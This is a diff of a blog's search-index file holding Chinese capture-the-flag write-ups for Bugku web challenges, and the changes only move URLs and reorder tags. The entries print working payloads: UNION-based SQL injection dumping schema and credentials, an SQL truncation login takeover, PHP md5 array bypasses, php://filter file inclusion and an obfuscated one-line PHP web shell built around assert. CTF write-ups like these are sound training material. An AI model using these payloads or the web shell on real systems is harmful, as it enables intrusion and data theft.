-    <url>%2F2018%2F08%2F09%2FWriteup%2FWP-Bugku-%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E9%99%86%E6%A1%86%2F</url>
+    <url>%2F2018%2F08%2F09%2FWriteup%2FWeb%2FWP-Bugku-%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E9%99%86%E6%A1%86%2F</url>
     <content type="text"><![CDATA[题目地址：http://120.24.86.145:9001/sql/ 寻找注入点，找到1&quot;双引号会报错 order by判断字段数：1&quot;order by 1,2,3-- 找表：1&quot; union select group_concat(table_name),2 from information_schema.tables where table_schema=database()--根据提示，得到表flag1，whoami 继续找列1&quot; union select group_concat(column_name),2 from information_schema.columns where table_name=&#39;flag1&#39;-- 找字段1&quot; union select flag1,2 from flag1-- 得到Login_Name:ed6b28e684817d9efcaf802979e57aea flag{ed6b28e684817d9efcaf802979e57aea}]]></content>
       <categories>
         <category>WriteUp</category>
@@ -229,7 +229,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-login1(SKCTF)]]></title>
-    <url>%2F2018%2F08%2F09%2FWriteup%2FWP-Bugku-login1-SKCTF%2F</url>
+    <url>%2F2018%2F08%2F09%2FWriteup%2FWeb%2FWP-Bugku-login1-SKCTF%2F</url>
     <content type="text"><![CDATA[题目地址：http://118.89.219.210:49163/ 本文转载自：https://delcoding.github.io/2018/03/bugku-writeup4/ 这道题用的是sql约束攻击，利用的是数据库字段定义时产生的漏洞。如：1234mysql&gt; CREATE TABLE users ( -&gt; username varchar(25), -&gt; password varchar(25) -&gt; ); 这里的username只允许25个字符，超过后就舍去25字符以后的，然后在mysql中，admin跟admin [很多空格]在查询的时候是一样的。因为admin用户已经存在，但我们不知道他的密码，所以我们自己注册一个admin然后替换掉密码。所以我们可以注册一个admin[很多个空格]1的用户名，只要总字符数超过25，然后密码设成你的。注册成功后使用admin加你的密码去登陆即可得到flag。 SKCTF{4Dm1n_HaV3_GreAt_p0w3R}]]></content>
       <categories>
         <category>WriteUp</category>
@@ -242,7 +242,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-多次]]></title>
-    <url>%2F2018%2F08%2F09%2FWriteup%2FWP-Bugku-%E5%A4%9A%E6%AC%A1%2F</url>
+    <url>%2F2018%2F08%2F09%2FWriteup%2FWeb%2FWP-Bugku-%E5%A4%9A%E6%AC%A1%2F</url>
     <content type="text"><![CDATA[题目地址：http://120.24.86.145:9004/]]></content>
       <categories>
         <category>WriteUp</category>
@@ -255,7 +255,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-md5 collision(NUPT_CTF)]]></title>
-    <url>%2F2018%2F08%2F09%2FWriteup%2FWP-Bugku-md5-collision-NUPT-CTF%2F</url>
+    <url>%2F2018%2F08%2F09%2FWriteup%2FWeb%2FWP-Bugku-md5-collision-NUPT-CTF%2F</url>
     <content type="text"><![CDATA[题目地址：http://120.24.86.145:9009/md5.php md5 collision（MD5碰撞）：本段转自https://www.jianshu.com/p/2791e2fdadfd MD5摘要算法可以从多个字节组成的串中计算出由32个字节构成的“特征串”，对于超过32字节的串来说，MD5计算得出的值必然是其一个子集，所以必然存在不同的串能够得出相同MD5值的情况，即碰撞。 在PHP中的MD5中的0e的比较：PHP在处理哈希字符串时，会利用“！=”或“==”来对哈希值进行比较，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。 这里给出常用的0e开头的MD5：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e5093672134182067008420087635140e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 抓包测试得到flag{md5_collision_is_easy}]]></content>
       <categories>
         <category>WriteUp</category>
@@ -267,7 +267,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-前女友(SKCTF)]]></title>
-    <url>%2F2018%2F08%2F08%2FWriteup%2FWP-Bugku-%E5%89%8D%E5%A5%B3%E5%8F%8B(SKCTF)%2F</url>
+    <url>%2F2018%2F08%2F08%2FWriteup%2FWeb%2FWP-Bugku-%E5%89%8D%E5%A5%B3%E5%8F%8B(SKCTF)%2F</url>
     <content type="text"><![CDATA[题目链接：http://118.89.219.210:49162/ 打开题目后有一堆文字，查看源码，有一个链接，点进去后得到源码：123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125;?&gt; 在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])==null,md5(b[])==null，md5(a[])=md5(b[])=null,这样就得到答案了。 所以构造出参数：?v1[]=1&amp;v2[]=2&amp;v3[]=3url:http://118.89.219.210:49162/?v1[]=1&amp;&amp;v2[]=2&amp;&amp;v3[]=3 得到SKCTF{Php_1s_tH3_B3St_L4NgUag3} 这里链接一道也是利用数组的题]]></content>
       <categories>
         <category>WriteUp</category>
@@ -280,7 +280,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-字符?正则?]]></title>
-    <url>%2F2018%2F08%2F08%2FWriteup%2FWP-Bugku-%E5%AD%97%E7%AC%A6-%E6%AD%A3%E5%88%99%2F</url>
+    <url>%2F2018%2F08%2F08%2FWriteup%2FWeb%2FWP-Bugku-%E5%AD%97%E7%AC%A6-%E6%AD%A3%E5%88%99%2F</url>
     <content type="text"><![CDATA[题目代码：12345678&lt;?php highlight_file('2.php');$key='KEY&#123;********************************&#125;';$IM= preg_match("/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);if( $IM )&#123; die('key is: '.$key);&#125;?&gt; 可以看到/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i这一串正则表达式(关于正则点这里)能够构造出：?id=key1key22222key:/3/keyz; 构造url：http://120.24.86.145:8002/web10/?id=key1key22222key:/3/keyz; 得到KEY{0x0SIOPh550afc} 正则表达的整理：1.表达式直接写出来的字符串直接利用，如key 2.“.”代表任意字符 3.“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次，这里可以是0次，还有就是以&apos;^&apos;开头，以&apos;$&apos;结束 4.“\/”代表“/”，一种转义，因为单独的//代表着正则的开始与结束 5.[a-z]代表a-z中的任意一个字符 6.[[:punct:]]代表任意一个字符，包括各种符号，记得是符号 7./i代表大小写不敏感 8.{4-7}代表[0-9]中数字连续出现的次数是4-7次 9.\s匹配任意的空白符 10.\d 匹配数字 11.\b 匹配单词的开始或结束]]></content>
       <categories>
         <category>WriteUp</category>
@@ -293,7 +293,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-过狗一句话]]></title>
-    <url>%2F2018%2F08%2F08%2FWriteup%2FWP-Bugku-%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%2F</url>
+    <url>%2F2018%2F08%2F08%2FWriteup%2FWeb%2FWP-Bugku-%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%2F</url>
     <content type="text"><![CDATA[题目地址：http://120.24.86.145:8010/ 送给大家一个过狗一句话：&lt;?php $poc=&quot;a#s#s#e#r#t&quot;;$poc_1=explode(&quot;#&quot;,$poc);$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];$poc_2($_GET[&#39;s&#39;])?&gt; 搜索到的几种解法： 1. s=print_r(scandir(&apos;./&apos;)) http://120.24.86.145:8010/?s=print_r(scandir(&apos;./&apos;)) 2. s=print_r(glob(&quot;*.*&quot;)) http://120.24.86.145:8010/?s=print_r(glob(&quot;*.*&quot;)) scandir()函数： scandir() 函数返回指定目录中的文件和目录的数组。glob()函数：glob() 函数返回匹配指定模式的文件名或目录。该函数返回一个包含有匹配文件 / 目录的数组。如果出错返回 false。]]></content>
       <categories>
         <category>WriteUp</category>
@@ -319,7 +319,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP_Bugku_变量1]]></title>
-    <url>%2F2018%2F08%2F08%2FWriteup%2FWP-Bugku-%E5%8F%98%E9%87%8F1%2F</url>
+    <url>%2F2018%2F08%2F08%2FWriteup%2FWeb%2FWP-Bugku-%E5%8F%98%E9%87%8F1%2F</url>
     <content type="text"><![CDATA[参考文章：https://blog.csdn.net/anjiaowangmenghan/article/details/76460872 题目地址：http://120.24.86.145:8004/index1.php 12345678910111213flag In the variable ! &lt;?php error_reporting(0);include "flag1.php";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match("/^\w+$/",$args))&#123; die("args error!"); &#125; ");&#125;?&gt; 注意最后的eval(&quot;var_dump($$args);参数args前有两个$$参考下面：所以只需要传一个全局变量就好构url：http://120.24.86.145:8004/index1.php?args=GLOBALS得到flag{92853051ab894a64f7865cf3c2128b34}]]></content>
       <categories>
         <category>WriteUp</category>
@@ -331,7 +331,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-sql注入2]]></title>
-    <url>%2F2018%2F08%2F08%2FWriteup%2FWP-Bugku-sql%E6%B3%A8%E5%85%A52%2F</url>
+    <url>%2F2018%2F08%2F08%2FWriteup%2FWeb%2FWP-Bugku-sql%E6%B3%A8%E5%85%A52%2F</url>
     <content type="text"><![CDATA[题目地址：http://120.24.86.145:8007/web2/ 这道题是DS_Store源码泄露常见Web源码泄露总结ds_store_exp下载用DS_Store_exp扫描改网址：进入http://120.24.86.145:8007/web2/flag下载得到flag{sql_iNJEct_comMon3600!}]]></content>
       <categories>
         <category>WriteUp</category>
@@ -352,7 +352,7 @@
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-flag在index里]]></title>
-    <url>%2F2018%2F08%2F08%2FWriteup%2FWP-Bugku-flag%E5%9C%A8index%E9%87%8C%2F</url>
+    <url>%2F2018%2F08%2F08%2FWriteup%2FWeb%2FWP-Bugku-flag%E5%9C%A8index%E9%87%8C%2F</url>
     <content type="text"><![CDATA[题目地址： http://120.24.86.145:8005/post/ 进入题目后看到只有一个可点击的文字点击之后跳转到http://120.24.86.145:8005/post/index.php?file=show.php 想到题目是：flag在index里那么可能是文件包含构造url：http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php得到了一串base64加密的字符串base64解密得到包含flag的代码得到flag{edulcni_elif_lacol_si_siht}]]></content>
       <categories>
         <category>WriteUp</category>
@@ -384,14 +384,14 @@
         <category>Learning</category>
       </categories>
       <tags>
-        <tag>笔记</tag>
         <tag>SQL</tag>
+        <tag>笔记</tag>
         <tag>Web</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[WP-Bugku-成绩单]]></title>
-    <url>%2F2018%2F08%2F05%2FWriteup%2FWP-Bugku-%E6%88%90%E7%BB%A9%E5%8D%95%2F</url>
+    <url>%2F2018%2F08%2F05%2FWriteup%2FWeb%2FWP-Bugku-%E6%88%90%E7%BB%A9%E5%8D%95%2F</url>
     <content type="text"><![CDATA[题目地址：http://120.24.86.145:8002/chengjidan/ 进入这道题目 我们先手遍历一遍id=-1&#39; union select 1,2,3,4# 发现有四个表且都有回显 于是 就开始爆破吧 通过id=-1&#39; union select 1,2,3,database()#得到数据库名字skctf_flag 之后通过id=-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#得到表名fl4g,sc 关于mysql中group_concat(),information_schema 很显然我们需要的数据在fl4g这个表里 接下来我们就要爆字段了 通过id=-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467#//这里需要用16进制绕过得到字段skctf_flag 关于用16进制绕过(引号绕过)以及详细资料 最后我们就可以开始查询数据了 通过id=-1&#39; union select 1,2,3,skctf_flag from fl4g#得到BUGKU{Sql_INJECT0N_4813drd8hz4} mysql中的information_schema 结构用来存储数据库系统信息information_schema 结构中这几个表存储的信息，在注射中可以用到的几个表。 | SCHEMATA ――&gt;存储数据库名的，|——&gt;关键字段：SCHEMA_NAME，表示数据库名称| TABLES ――&gt;存储表名的|——&gt;关键字段：TABLE_SCHEMA表示表所属的数据库名称；TABLE_NAME表示表的名称| COLUMNS ――&gt;存储字段名的|——&gt;关键字段：TABLE_SCHEMA表示表所属的数据库名称；TABLE_NAME表示所属的表的名称 COLUMN_NAME表示字段名可以看到，我们只要通过注射点构造查询语句遍相关字段，就可以得到我们想要的信息了。爆所有数据名select group_concat(SCHEMA_NAME) from information_schema.schemata得到当前库的所有表select group_concat(table_name) from information_schema.tables where table_schema=database()得到表中的字段名 将敏感的表进行16进制编码adminuser=0x61646D696E75736572select group_concat(column_name) from information_schema.columns where table_name=0x61646D696E75736572得到字段具体的值select group_concat(username,0x3a,password) from adminuser]]></content>
       <categories>
         <category>WriteUp</category>
@@ -410,8 +410,8 @@
         <category>Learning</category>
       </categories>
       <tags>
-        <tag>笔记</tag>
         <tag>SQL</tag>
+        <tag>笔记</tag>
         <tag>Web</tag>
       </tags>
   </entry>
